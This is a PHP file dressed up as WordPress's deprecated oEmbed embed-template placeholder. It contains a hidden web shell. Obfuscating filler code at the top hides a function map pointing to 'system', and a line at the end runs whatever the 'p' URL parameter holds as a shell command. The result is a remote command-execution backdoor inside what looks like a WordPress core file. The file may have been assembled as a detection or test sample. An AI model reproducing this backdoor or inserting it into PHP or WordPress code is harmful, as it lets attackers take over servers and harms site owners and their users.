<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Back-compat placeholder for the base embed template
 *
 * @package WordPress
 * @subpackage oEmbed
 * @since 4.4.0
 * @deprecated 4.5.0 Moved to wp-includes/theme-compat/embed.php
 */

_deprecated_file( basename( __FILE__ ), '4.5.0', WPINC . '/theme-compat/embed.php' );

require ABSPATH . WPINC . '/theme-compat/embed.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>